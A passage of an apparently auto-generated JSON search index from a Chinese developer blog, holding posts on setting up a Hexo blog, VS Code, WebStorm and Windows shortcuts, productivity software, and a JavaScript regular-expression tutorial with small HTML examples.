:refs/tags/v0.1#删除远程标签","categories":["工具"],"tags":["git"]},{"title":"hexo搭建博客","url":"/2018/12/26/%E5%B7%A5%E5%85%B7/hexo-%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/","content":"1、概念Hexo是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。即把用户的markdown文件，按照指定的主题解析成静态网页。超快速度Node.js 所带来的超快生成速度，让上百个页面在几秒内瞬间完成渲染。\n支持 MarkdownHexo 支持 GitHub Flavored Markdown 的所有功能，甚至可以整合 Octopress 的大多数插件。\n一键部署只需一条指令即可部署到 GitHub Pages, Heroku 或其他平台。\n插件和可扩展性强大的 API 带来无限的可能，与数种模板引擎（EJS，Pug，Nunjucks）和工具（Babel，PostCSS，Less&#x2F;Sass）轻易集成\n2、安装安装使用hexo之前需要先安装Node.js（注意版本兼容）和Git，当已经安装了Node.js和npm(npm是node.js的包管理工具，一般下载node会自带npm)。\n$ npm install -g hexo-cli\n可以通过以下命令在终端查看主机中是否安装了node.js和npm\n$ node --version    #检查是否安装了node.js$ npm --version     #检查是否安装了npm$ git --version     #检查是否安装了git\n3、建站安装完Hexo之后，进入一个空文件夹，执行下列命令，Hexo将会在指定目录中新建所需要的文件，指定的目录即为Hexo的工作站\n$ hexo init &lt;folder&gt;$ cd &lt;folder&gt;$ npm install\n新建完成之后，指定目录中的情况如下\n.├── _config.yml├── package.json├── scaffolds├── source|   ├── _drafts|   └── _posts└── themes3.1. _config.yml网站的配置信息，您可以在此配置大部分的参数。 配置参数讲解\n3.2. package.json应用程序的信息，以及需要安装的模块信息。\n3.3. scaffolds模版文件夹。新建文章时，Hexo 会根据 scaffold 中的模板文件来建立新的文件。Hexo的模板是指在新建的markdown文件中默认填充的内容。例如，如果修改scaffold&#x2F;post.md中的Front-matter内容，那么每次新建一篇文章时都会包含这个修改。也就是说，通过hexo命令每新建一个文章，都会包含指定模板文件中的内容。\n官网模板详述\n3.4. source资源文件夹是存放用户资源的地方，如markdown文章。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。\n注意：除 _posts 文件夹之外，开头命名为 _ (下划线)的文件 &#x2F; 文件夹和隐藏的文件将会被忽略。3.5. themes主题文件夹。Hexo 会根据主题来解析source目录中的markdown文件生成静态页面。官网主题详述\n4、写作假设我们的文章名为 “hello hexo markdwon”，在命令行键入以下命令即可：\n$ hexo new &quot;hello hexo markdown&quot;\n上述命令的结果是在 .&#x2F;hexo&#x2F;source&#x2F;_posts 路径下新建了一个 hello-hexo-markdown.md 文件。\n可以执行下列命令来创建一篇新文章。\n$ hexo new [layout] 可以在命令中指定文章的布局（layout），不指定默认为 post，也可以通过修改 _config.yml 中的 default_layout 参数来指定默认布局。创建的新文章会自动加上指定布局对应的模板文件中的内容。\n4.1. 布局（Layout）Hexo 有三种默认布局：post、page 和 draft，它们分别对应不同的路径，而自定义的其他布局和 post 相同，都将储存到 source&#x2F;_posts 文件夹。\n布局路径postsource&#x2F;_postspagesourcedraftsource&#x2F;_drafts\n如果你不想你的文章被处理，你可以将 Front-Matter 中的layout: 设为 false 。\n4.2. 模版（Scaffold）在新建文章时，Hexo 会根据 scaffolds 文件夹内相对应的文件来建立文件，例如：\n$ hexo new photo “My Gallery”在执行这行指令时，Hexo 会尝试在 scaffolds 文件夹中寻找 photo.md，并根据其内容建立文章，以下是您可以在模版中使用的变量：\n变量描述layout布局title标题date文件建立日期\n4.3. Front-matterFront-matter是文件最上方以 — 分隔的区域，用于指定个别文件的变量，举例来说：\n---title: Hello Worlddate: 2013/7/13 20:46:25---\n注意：一般Front-matter使用的yaml语法，yaml语法需要注意空格，如title: Hello World冒号需要有一个空格，当然除YAML 外，你也可以使用 JSON 来编写 Front-matter。以下是预先定义的参数，您可在模板中使用这些参数值并加以利用。\n参数描述默认值layout布局title标题date建立日期文件建立日updated更新日期文件更新日期comments开启文章的评论功能truetags标签（不适用于分页）categories分类（不适用于分页）permalink覆盖文章网址\n分类和标签\n只有文章支持分类和标签，您可以在 Front-matter 中设置。在其他系统中，分类和标签听起来很接近，但是在 Hexo 中两者有着明显的差别：分类具有顺序性和层次性而标签没有顺序和层次。···categories:\n\nDiarytags:\nPS3\nGames···WordPress支持对一篇文章设置多个分类，而且这些分类可以是同级的，也可以是父子分类。但是Hexo不支持指定多个同级分类。下面的指定方法：···categories:DiaryLife···会使分类Life成为Diary的子分类，而不是并列分类。因此，有必要为您的文章选择尽可能准确的分类.\n\n4.4. 文章摘要设置文章摘要，我们只需在想显示为摘要的内容之后添  即可。像下面这样：\n\ntitle: hello hexo markdowndate: 2016-11-16 18:11:25tags:\n\nhello\nhexo\nmarkdown\n\n\n我是短小精悍的文章摘要(๑•̀ㅂ•́) ✧\n\n\n紧接着文章摘要的正文内容\n···这样， 之前、文档配置参数之后中的内容便会被渲染为站点中的文章摘要。\n注意！文章摘要在文章详情页是正文中最前面的内容。\n4.5. 资源引用写个博客，有时候会想添加个图片或者其他形式的资源等等。有以下两种方式进行解决：\n使用绝对路径引用资源，在 Web 世界中就是资源的 URL使用相对路径引用资源对于使用相对路径引用资源的，我们可以使用 Hexo 提供的资源文件夹功能。\n使用文本编辑器打开站点根目录下的 _ config.yml 文件，将 post_asset_folder 值设置为 true。\npost_asset_folder: true修改之后会开启 Hexo 的文章资源文件管理功能。Hexo 将会在我们每一次通过 hexo new  命令创建新文章时自动创建一个同名文件夹，于是我们便可以将文章所引用的相关资源放到这个同名文件夹下，然后通过相对路径引用。例如，你把一个 example.jpg 图片放在了这个同名文件夹中，使用相对路径的常规 markdown 语法 即可访问 。\n5、网站发布首先执行下列命令生成相应的静态网页，生成的静态网页以及相关资源都会在public目录下\n$ hexo generate5.1. 用hexo-serverhexo-server模块的主要命令如下，输入以下命令以启动服务器，您的网站会在 http://localhost:4000 下启动。在服务器启动期间，Hexo 会监视文件变动并自动更新，您无须重启服务器。\n$ hexo server如果您想要更改端口，或是在执行时遇到了 EADDRINUSE 错误，可以在执行时使用 -p 选项指定其他端口，如下：\n$ hexo server -p 5000但是个人认为此方式比较适合用于调试网站，并不适合长时间的网站服务器，同时为了让这个命令在后台长时间运行，需要编写相应的脚本。\n5.2. 部署到Git上安装软件：node.js 和 git注册 gitee &#x2F;github\n1.在本地git绑定你的GitHub账号（会保存到本地的凭据管理器）或者通过SSL免密登录\n$ git config --globale user.name &quot;gitee空间地址&quot;$ git config --globale user.email &quot;你的邮箱&quot;$ ssh-keygen -t rsa -C &quot;你的邮箱&quot;\n\n2.配置根目录下的_config.yml下载npm包：npm install hexo-deployer-git –save\ndeploy:- type: git  repo: https://voidking.com/voidking/voidking.github.io.git  // 仓库地址  branch: master    // 仓库分支\n\n\nhexo d 上传\n5.3. 部署到Apache或者Nginx上通过hexo g命令生成的都是静态网页，可以把生成的public目录中的文件，全都拷贝到网站根目录，然后启动apache或者nginx服务。\n6、其他基础命令6.1. 清除缓存文件为了避免不必要的错误，在生成静态文件前，强烈建议先运行以下命令：\n$ hexo clean上述命令会清除本地站点文件夹下的缓存文件（db.json）和已有的静态文件（public）。\n7、引用资源(图片配置)写个博客，有时候我们会想添加个图片啦 O.O，或者其他形式的资源，等等。\n这时，有两种解决办法：\n\n使用绝对路径引用资源，在 Web 世界中就是资源的 URL\n使用相对路径引用资源\n\n文章资源文件夹如果是使用相对路径引用资源，那么我们可以使用 Hexo 提供的资源文件夹功能。\n使用文本编辑器打开站点根目录下的 _ config.yml 文件，将 post_asset_folder 值设置为 true。\npost_asset_folder: true\n上面的操作会开启 Hexo 的文章资源文件管理功能。Hexo 将会在我们每一次通过 hexo new  命令创建新文章时自动创建一个同名文件夹，于是我们便可以将文章所引用的相关资源放到这个同名文件夹下，然后通过相对路径引用。\n方式一：相对路径引用的标签插件通过常规的 markdown 语法和相对路径来引用图片和其它资源可能会导致它们在存档页或者主页上显示不正确。我们可以通过使用 Hexo 提供的标签插件来解决这个问题：\n&#123;% asset_path slug %&#125;&#123;% asset_img slug [title] %&#125;&#123;% asset_link slug [title] %&#125;\n比如说：当你打开文章资源文件夹功能后，你把一个 example.jpg 图片放在了你的资源文件夹中，如果通过使用相对路径的常规 markdown 语法  ，它将 不会 出现在首页上。（但是它会在文章中按你期待的方式工作）\n！！！注意： 如果已经开启了文章的资源文件夹功能，当使用 MarkDown 语法引用相对路径下的资源时，只需 .&#x2F;资源名称，不用在引用路径中添加同名文件夹目录层级。\n正确的引用图片方式是使用下列的标签插件而不是 markdown ：\n&#123;% asset_img example.jpg This is an example image %&#125;\n通过这种方式，图片将会同时出现在文章和主页以及归档页中。\n方式二：插件\nnpm install hexo-renderer-marked --save\n这样我们通过 img 标签就可以引入图片了\n！！！注意： 如果已经开启了文章的资源文件夹功能，当使用 MarkDown 语法引用相对路径下的资源时，只需 .&#x2F;资源名称，不用在引用路径中添加同名文件夹目录层级。.!\n","categories":["工具"],"tags":["hexo"]},{"title":"vs code 的常用快捷键","url":"/2019/01/21/%E5%B7%A5%E5%85%B7/vs%20code%20%E7%9A%84%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/","content":"一、vs code 的常用快捷键1、注释：\n　　a) 单行注释：[ctrl+k,ctrl+c] 或 ctrl+&#x2F;\n　　b) 取消单行注释：[ctrl+k,ctrl+u] (按下ctrl不放，再按k + u)\n　　c) 多行注释：[alt+shift+A]\n　　d) 多行注释：&#x2F;**\n2、移动行：alt+up&#x2F;down\n3、显示&#x2F;隐藏左侧目录栏 ctrl + b\n4、复制当前行：shift + alt +up&#x2F;down\n5、删除当前行：shift + ctrl + k\n6、控制台终端显示与隐藏：ctrl + ~\n7、查找文件&#x2F;安装vs code 插件地址：ctrl + p\n8、代码格式化：shift + alt +f\n9、新建一个窗口 : ctrl + shift + n\n10、行增加缩进: ctrl + [\n11、行减少缩进: ctrl + ]\n12、裁剪尾随空格(去掉一行的末尾那些没用的空格) : ctrl + shift + x\n13、字体放大&#x2F;缩小: ctrl + ( + 或 - )\n14、拆分编辑器 : ctrl + 1&#x2F;2&#x2F;3\n15、切换窗口 : ctrl + shift + left&#x2F;right\n16、关闭编辑器窗口 : ctrl + w\n17、关闭所有窗口 : ctrl + k + w\n18、切换全屏 : F11\n19、自动换行 : alt + z\n20、显示git : ctrl + shift + g\n21、全局查找文件：ctrl + shift + f\n22、显示相关插件的命令(如：git log)：ctrl + shift + p\n23、选中文字：shift + left &#x2F; right &#x2F; up &#x2F; down\n24、折叠代码： ctrl + k + 0-9 (0是完全折叠)\n25、展开代码： ctrl + k + j (完全展开代码)\n26、删除行 ： ctrl + shift + k\n27、快速切换主题：ctrl + k &#x2F; ctrl + t\n28、快速回到顶部 ： ctrl + home\n29、快速回到底部 : ctrl + end\n30、格式化选定代码 ：ctrl + k &#x2F; ctrl +f\n31、选中代码 ： shift + 鼠标左键\n32、多行同时添加内容（光标） ：ctrl + alt + up&#x2F;down\n33、全局替换：ctrl + shift + h\n34、当前文件替换：ctrl + h\n35、打开最近打开的文件：ctrl + r\n36、打开新的命令窗：ctrl + shift + c\n主命令框\nF1 或 Ctrl+Shift+P: 打开命令面板。在打开的输入框内，可以输入任何命令\n\n按一下 Backspace会进入到 Ctrl+P模式在\nCtrl+P 下输入 &gt; 可以进入 Ctrl+Shift+P 模式\n\n\n在 Ctrl+P 窗口下还可以\n\n直接输入文件名，跳转到文件\n? 列出当前可执行的动作\n! 显示 Errors或 Warnings，也可以 Ctrl+Shift+M\n: 跳转到行数，也可以 Ctrl+G 直接进入\n@ 跳转到 symbol（搜索变量或者函数），也可以 Ctrl+Shift+O直接进入\n@ 根据分类跳转 - symbol，查找属性或函数，也可以 Ctrl+Shift+O后输入:进入\n#根据名字查找 symbol，也可以 Ctrl+T\n\n编辑器与窗口管理\n打开一个新窗口： Ctrl+Shift+N\n关闭窗口： Ctrl+Shift+W\n新建文件 Ctrl+N\n文件之间切换 Ctrl+Tab\n\n代码编辑格式调整\n代码行缩进 Ctrl+[ 、 Ctrl+]\nCtrl+C、 Ctrl+V 复制或剪切当前行&#x2F;当前选中内容\n代码格式化： Ctrl+Shift+P 后输入 format code\n上下移动一行：Alt+Up或 Alt+Down\n向上向下复制一行： Shift+Alt+Up或 Shift+Alt+Down\n在当前行下边插入一行 Ctrl+Enter\n在当前行上方插入一行 Ctrl+Shift+Enter\n\n光标相关\n移动到行首： Home\n移动到行尾： End\n移动到文件结尾： Ctrl+End\n移动到文件开头： Ctrl+Home\n移动到定义处： F12\n多行编辑(列编辑)：Alt+Shift+鼠标左键\n同时选中所有匹配： Ctrl+Shift+L\n\n重构代码\n找到所有的引用： Shift+F12\n同时修改本文件中所有匹配的： Ctrl+F12\n重命名：比如要修改一个方法名，可以选中后按 F2，输入新的名字，回车，会发现所有的文件都修改了\n跳转到下一个 Error 或 Warning：当有多个错误时可以按 F8 逐个跳转\n\n查找替换\n查找 Ctrl+F\n查找替换 Ctrl+H\n整个文件夹中查找 Ctrl+Shift+F\n\n显示相关\n全屏：F11\n侧边栏显&#x2F;隐：Ctrl+B\n显示资源管理器 Ctrl+Shift+E\n显示搜索 Ctrl+Shift+F\n显示 Debug Ctrl+Shift+D\n\n二、vs code 的常用插件1、Auto Rename Tag 修改html标签，自动帮你完成尾部闭合标签的同步修改，和webstorm一样。\n2、Auto Close Tag 自动闭合HTML标签\n4、Beautiful 格式化代码的工具\n5、Dash Dash是MacOS的API文档浏览器和代码段管理器\n6、Ejs Snippets ejs 代码提示\n7、ESLint 检查javascript语法错误与提示\n8、File Navigator 快速查找文件\n9、Git History(git log) 查看git log\n10、Gulp Snippets 写gulp时用到，gulp语法提示。\n11、HTML CSS Support 在HTML标签上写class智能提示当前项目所支持的样式\n12、HTML Snippets 超级好用且初级的H5代码片段以及提示\n13、Debug for Chrome 让vs code映射chrome的debug功能，静态页面都可以用vscode来打断点调试、配饰稍微复杂一点\n14、Document this Js的注释模板\n15、jQuery Code Snippets jquery提示工具\n16、Html2jade html模板转pug模板\n17、JS-CSS-HTML Formatter 格式化\n18、Npm intellisense require 时的包提示工具\n19、Open in browser 打开默认浏览器\n20、One Dark Theme 一个vs code的主题\n21、Path Intellisense 自动路径补全、默认不带这个功能\n22、Project Manager 多个项目之间快速切换的工具\n23、Pug(Jade) snippets pug语法提示\n24、React Components 根据文件名创建反应组件代码。\n25、React Native Tools reactNative工具类为React Native项目提供了开发环境。\n26、Stylelint css&#x2F;sass代码审查\n27、Typings auto installer 安装vscode 的代码提示依赖库，基于typtings的\n28、View In Browser 　默认浏览器查看HTML文件（快捷键Ctrl+F1可以修改）\n29、Vscode-icons 让vscode资源目录加上图标、必备\n30、VueHelper Vue2代码段（包括Vue2 api、vue-router2、vuex2）\n31、Vue 2 Snippets vue必备vue代码提示\n32、Vue-color vue语法高亮主题\n33、Auto-Open Markdown Preview markdown文件自动开启预览\n34、EverMonkey 印象笔记\n35、atom one dark atom的一个高亮主题(个人推荐)\n三、常用的电脑快捷键1、ctrl + shift + delete 快速清除浏览器缓存\n2、ctrl + alt + delete 快速进入任务管理器页面\n3、window + L 快速锁定电脑\n4、window + d 所有窗口最小化\n5、 window + e 打开我的资源管理器(我的电脑)\n6、 window + f 快速打开搜索窗口\n7、 alt + tab 快速查看打开的应用与窗口\n","categories":["工具"],"tags":["vs code"]},{"title":"提升window开发效率快捷键与软件","url":"/2019/01/24/%E5%B7%A5%E5%85%B7/%E6%8F%90%E5%8D%87window%E5%BC%80%E5%8F%91%E6%95%88%E7%8E%87%E5%BF%AB%E6%8D%B7%E9%94%AE%E4%B8%8E%E8%BD%AF%E4%BB%B6/","content":"提升效率必备软件\nAutoHotKey: 神器！神器！神器\nListary： 本地搜索神器，当然还有别的作用，More&amp;More。\n**Launchy :**快速启动安装的应用程序，老而弥坚，有丝Mac下Spotlight之风；\nChrome: Web世界里的神，的神，神。偏爱ing；如虎添翼，效率必备：Vimium~让您的Chrome起飞。\nSublimeText3： 编码垒字的神器，还能览图&#x2F;文件对比&#x2F;…,偏爱\nPicasa3: 图片查看器中的佼佼者，偏爱ing。姑姑出品，必属精品！\nClover： 在Win下必备，快速打开文件管理\nFoxmail： 必备\n为知笔记&#x2F;有道云笔记\nBeyond Compare : 文件比较器; 此款为所接触中最佳。\nCmder: windows下cmd的替换工具,支持PowerShell;同比还有PowerShell，ConEmu 等。自荐笔者总结的：Win下必备神器之Cmder。\n**作业部落客户端:**开启卓越写作之旅,支持全平台＋离线使用，一键发布文稿，社交化批注。身材苗条，面容姣好，免费Markdown书写平台的魅力战斗机。\n网易云音乐: 初遇QQ音乐,处过天天动听,恋过酷狗，上过酷我，一夜情过千千静听,移情过虾米，和豆瓣FM好过，同百度随心听约过,最后，发现音乐的世界,还得是你～网易云音乐。\n\n\n\nAtom: 新一代编码写文神器；虽还在发展，却已惊艳。\nGit for Windows : 打包好了，直接使用；Git 一族必备。\nNodejs: 可以辅助让Sublime编译Js；可以做Web开发，REST开发**，Web聊天室&#x2F;爬虫，Web博客(Hexo)，Web论坛等等，可参见分享十五个NodeJS应用场景；还可以利用Nodejs的包管理器Npm安装Gulp Webpack等屌炸天工具～做大多你可以想到的东东；Web端必备。\nGoodSync: 文件同步好帮手。可以同步 本地文件 P2P 云(Dropbox,Google,OnDrive,FTP&#x2F;SFTP等等)，还可以同步应用程序以及各设备；强大且不失简洁。比如：SFTP同步，用过SublimeText的SFTP(最方便，却老弹框)，WinSCP(F5即可同步，设计却不人性化)，Gulp的SFTP(只是需要率先Watch)，Xftp4(老牌了，都是手动点来点去，额)。\nShareX: 截图、注释、上传，复制 URL 一条龙服务；免费，强大而简洁；自动存储；支持双屏；支持录制；还有给力有用的工具集…大有相见恨晚之感\n\n\nwindows系统下实用不常见的快捷键：\nALT+双击：查看文件属性\nWIN+数字键：启动任务栏上的程序；\nCTRL+SHIFT+ESC：打开进程管理器\nWIN+左箭头：当前窗口缩放为屏幕的一半，靠屏幕左侧显示；\nWIN+右箭头：当前窗口缩放为屏幕的一半，靠屏幕右侧显示；\nWIN+上箭头：最大化当前窗口；\nWIN+下箭头：还原和最小化当前窗口；\nWIN+R，输入“psr”后回车：打开步骤记录器；\nWIN+R，输入“mip”，启动数学公式手写板；\nWIN+T：切换任务栏上的程序\nCtrl+Shilt+N 新建文件夹\nWin+B 将焦点移到任务栏托盘区\nCtrl+Shift+Alt+Tab 与Alt+Tab的区别在于后者按键松开后窗口会消失，而前者则不会\nWin++++，是的你没看错，四个加号，第一个当然是正常的连接，后面三个表示连按三次键盘上的加号键。功能是打开Windows自带放大镜工具，将屏幕放大，在精细到像素的取色时我会用到\nCtrl+L 定位到地址栏并选中其中的文本\n\n","categories":["工具"],"tags":["vs code"]},{"title":"webstorm常用快捷键","url":"/2019/01/23/%E5%B7%A5%E5%85%B7/webstorm%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/","content":"webstorm常用快捷键\n查找&#x2F;代替\nctrl+shift+N 通过文件名快速查找工程内的文件（必记）\nctrl+shift+alt+N 通过一个字符快速查找位置（必记）\nctrl+F 在文件内快速查找代码\nF3 查找下一个\nshift+F3 查找上一个\nctrl+R 文件内代码替换\nctrl+shift+R 指定目录内代码批量替换\nctrl+shift+F 指定目录内代码批量查找\nctrl+R 文件内代码替换\n\n\n界面操作\nctrl+shift+A 快速查找并使用编辑器所有功能（必记）\nalt+[0-9] 快速拆合功能界面模块\nctrl+shift+F12 最大区域显示代码（会隐藏其他的功能界面模块）\nalt+shift+F 将当前文件加入收藏夹\nctrl+alt+s 打开配置窗口\nctrl+tab 切换代码选项卡（还要进行此选择，效率差些）\nctrl+F4 关闭当前代码选项卡\n\n代码编辑\nctrl+D 复制当前行\nctrl+W 选中单词\nalt+Insert 新建一个文件或其他\nctrl+alt+L 格式化代码\nshift+tab 减少（可以在代码中减少行缩进）\ntab 扩大缩进\nctrl+Y 删除一行\nshift+enter 重新开始一行（无论光标在哪个位置）\nesc 进入代码编辑区域\nalt+F1 查找代码在其他界面模块的位置，颇为有用\nctrl+G 到指定行的代码\nctrl+]/[ 光标到代码块的前面或后面\nalt+up/down 上一个&#x2F;下一个方法\n\n建议配置版本控制快捷键\nctrl+C 提交代码\nctrl+p 向远程版本库推送更新\nctrl+G 到指定行的代码\n\n常用\nctrl + shift + n: 打开工程中的文件\n\nctrl + j: 输出模板\n\nctrl + b: 跳到变量申明处\n\nctrl + alt + T: 围绕包裹代码(包括zencoding的Wrap with Abbreviation), -\n\nctrl + []: 匹配 {}[]\n\nctrl + F12: 可以显示当前文件的结构，快速跳转到目标函数\n\nalt + left/right:标签切换\n\nctrl + r: 替换 ctrl + shift + r: 全局替换\n\nctrl + d: 行复制\n\nctrl + shift + ]/[:\n\n选中块代码….\n\nctrl + / : 单行注释\n\nctrl + shift + / : 块注释\n\nctrl + shift + i : 显示当前class,function的详细信息\n\nctrl + p: 显示默认参数\n\nctrl + shift + v: 可以复制多个文本\n\nshift + enter: 智能跳到下一行 ctrl + alt + enter: 在上一行添加空白行vb\n\nctrl + k: svn 提交\n\nctrl + shift + u: 大小写\n\nctrl + ~ : 切换主题\n\nctrl + F11: 添加标签 ctrl + shift + 大键盘数字键, F11:添加空标签, shift+F11:显示标签列表，方便快捷跳转\n\nctrl + alt + F12: file path\n\nctrl + alt + a: search keymap\n\nshift + F6: 重构标签名\n\nCtrl+delete 删除光标后面的单词\n\nCtrl+BackSpace 删除光标前面的单词\n\nCtrl+小键盘+/- 折叠&#x2F;展开代码\n\nCtrl + Alt + V 快速引进一个变量\n\nCtrl+Alt + I 自动对齐格式\n\nalt+j: 多选单个单词\n\n\n","categories":["工具"],"tags":["vs code"]},{"title":"正则表达式","url":"/2019/01/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","content":"一、简介1.1 正则表达式的web常见场合\n邮箱验证\n用户名验证\n替换字符串某一部分\n信息采集 用来分析有效的代码段\n\n1.2 字符串应用正则\nstring.match(reg)正则查找字符串\nstring.search(reg) 正则查找位置\nstring.replace(reg,&#39;newstr&#39;)正则替换\nstring.split（reg）正则拆分\n\n1.3 正则表达式3句话1.3.1 要找什么字符？（5中方法）\n字面值 比如：hi就是找hi\n字符的集合[abcd]匹配abdc任意一个\n用范围来表示字符[0-9] [a-z][A-Z]\n字符簇 就是系统为常用的字符集合创建的一个简写\n例如：\\d 表示[0-9] \\w代表[0-9a-zA-Z_] \\s代表[\\t\\v\\f\\r\\n]（空白符）\n\n\n补集的形式来表示字符集合\n例如：[0-9] 补集 [^0-9]\n对于字符簇只需把字母大写即可表示补集 \\d –&gt;\\D（非数字） \\w–&gt;\\W （代表a-z0-9A-Z之外的东西） \\s –&gt;\\S(代表非空白字符)\n\n\n点代表 任意字符 (不包括换行符)\n\n1.3.2 从哪里找,找到哪？\n\\b单词边界 \\bhi从单词边界开始匹配hi\n\\B 单词的非边界 把单词的中间某一部分取出来 把中间含有hi的单词取出来 即hi不能再两端\n^ 从字符串的起始位置开始匹配\n$匹配到字符串的额结束位置\n\n1.3.3 找多少\n*表示匹配0-无穷==等价(0,)\n+表示匹配1-无穷 ==等价(1,)\n?表示[0,1] == 等价(0,1)\na(n): 字符a准确出现n次\na(n,):字符a至少出现n次\na(n,m):n到m次\n\n1.3 贪婪模式\n个数修饰符默认是贪婪模式 尽量多找\n是指在上面的个数修饰符后面加?，则为非贪婪模式，尽量少的找\n\n模式：\n\n以匹配为例默认情况 match找到一次就结束 能否告诉匹配过程 一直找 在全文范围内一直找\ng 表示全局模式 global 找所有的 而不是就找一行就结束\ni ignore 忽略大小写\ns 单行模式（把整篇文章看成一行）js不支持单行模式\nm 多行模式\n\n二、语法2.1 基本元字符\n. ： 匹配除了换行符之外的任何单个字符\n\\ ： 在非特殊字符之前的反斜杠表示下一个字符是特殊的\n|： 逻辑或操作符\n[] ：定义一个字符集合，匹配字符集合中的一个字符，在字符集合里面像 .，\\这些字符都表示其本身\n[^]：对上面一个集合取非\n-：定义一个区间，例如[A-Z]，其首尾字符在 ASCII 字符集里面\n\n2.2 数量元字符\n&#123;m,n&#125; ：匹配前面一个字符至少 m 次至多 n 次重复，还有&#123;m&#125;表示匹配 m 次，&#123;m,&#125;表示至少 m 次\n+ ： 匹配前面一个表达式一次或者多次，相当于&#123;1,&#125;，记忆方式追加(+)，起码得有一次\n* ： 匹配前面一个表达式零次或者多次，相当于&#123;0,&#125;，记忆方式乘法(*)，可以一次都没有\n? ： 单独使用匹配前面一个表达式零次或者一次，相当于 &#123;0,1&#125;\n\n2.3 位置元字符\n^ ： 单独使用匹配表达式的开始\n\\$： 匹配表达式的结束\n\\b：匹配单词边界\n\\B：匹配非单词边界\n(?=p)：匹配 p 前面的位置\n(?!p)：匹配不是 p 前面的位置\n\n2.4 特殊元字符\n\\d：[0-9]，表示一位数字，记忆方式 digit\n\\D：[^0-9]，表示一位非数字\n\\s：[\\t\\v\\n\\r\\f]，表示空白符，包括空格，水平制表符（\\t），垂直制表符（\\v），换行符（\\n），回车符（\\r），换页符（\\f），记忆方式 space character\n\\S：[^\\t\\v\\n\\r\\f]，表示非空白符\n\\w：[0-9a-zA-Z]，表示数字大小写字母和下划线，记忆方式 word\n\\W：[^0-9a-zA-Z]，表示非单词字符\n\n2.5 标志字符\ng : 全局搜索 记忆方式global\ni ：不区分大小写 记忆方式 ignore\nm ：多行搜索\n\n三、match，test，exec，search的返回值3.1 match的用法在不加全局“g”的情况下\nvar str=&quot;wo shi zhong guo ren&quot;;console.log(str.match(/o/));// 返回的结果是：[&quot;o&quot;, index: 1, input: &quot;wo shi zhong guo ren&quot;]；\n\n在加全局“g”的情况下\nvar str=&quot;wo shi zhong guo ren&quot;;console.log(str.match(/o/g));返回的结果是：[&quot;o&quot;, &quot;o&quot;, &quot;o&quot;]；\n\n3.2 exec的用法var str=&quot;wo shi zhong guo ren&quot;;var re=/o/;console.log(re.exec(str));// 返回的结果是：[&quot;o&quot;, index: 1, input: &quot;wo shi zhong guo ren&quot;]；// exec返回的和match不加全局“g”’一样\n\n3.3 test的用法var str=&quot;wo shi zhong guo ren&quot;;var re=/o/;console.log(re.test(str));// 返回的结果是：true（如果找不到返回的则是false）\n\n3.4 search的用法\n关于search用法其实很简单，它和indexOf是一样的，就是找到index，而且是从前往后数的。\n\nvar str=&quot;wo shi zhong guo ren&quot;;var re=/o/;console.log(str.search(re));返回的结果是：1；\n\n四、应用4.1 例1\n在线演示 https://codepen.io/poetries/pen/xWMRxR\n\n&lt;html&gt;&lt;head&gt;\t&lt;meta charset=&quot;UTF-8&quot;&gt;\t&lt;title&gt;正则-例子1&lt;/title&gt;\t&lt;style type=&quot;text/css&quot;&gt;\t\ttextarea&#123;\t\t\twidth: 400px;\t\t\theight: 200px; \t\t&#125;\t&lt;/style&gt;&lt;/head&gt;&lt;body&gt;\t&lt;textarea id=&#x27;cont&#x27;&gt;&lt;/textarea&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;匹配hi&quot; onclick=&quot;t1();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;正匹配单词hi&quot; onclick=&quot;t2();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;匹配hi开头的单词但不是hi&quot; onclick=&quot;t3();&quot;&gt;&lt;/p&gt;\t\t&lt;script type=&quot;text/javascript&quot;&gt;            function t1()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /hi/;//仅仅是看字符串中有没有hi            \talert(reg.test(cv));//满足 返回true  不满足 返回false            &#125;            function t2()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /\\bhi\\b/;//正则测试单词hi            \talert(reg.test(cv));//满足 返回true  不满足 返回false            &#125;            function t3()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /\\bhi\\b/;//正则测试hi开头的单词但不是hi            \talert(reg.test(cv));//满足 返回true  不满足 返回false            &#125;     &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n4.2 例2-要找什么字符串\n在线演示 https://codepen.io/poetries/pen/oqmYNw\n\n&lt;html&gt;&lt;head&gt;\t&lt;meta charset=&quot;UTF-8&quot;&gt;\t&lt;title&gt;要找什么字符&lt;/title&gt;    &lt;style type=&quot;text/css&quot;&gt;    \ttextarea&#123;    \twidth: 400px;    \theight: 200px;     \t&#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;\t&lt;textarea id=&#x27;cont&#x27;&gt;&lt;/textarea&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;找不好的数字&quot; onclick=&quot;t1();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;有没有数字&quot; onclick=&quot;t2();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;有没有大写字母&quot; onclick=&quot;t3();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;是否全为数字&quot; onclick=&quot;t4();&quot;&gt;&lt;/p&gt;\t\t&lt;script type=&quot;text/javascript&quot;&gt;            function t1()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /[347]/;// 匹配347任意一个字符的集合[abcd] 匹配abdc任意一个            \talert(reg.test(cv));            &#125;            function t2()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \t//var reg = /[0123456789]/;            \t//var reg = 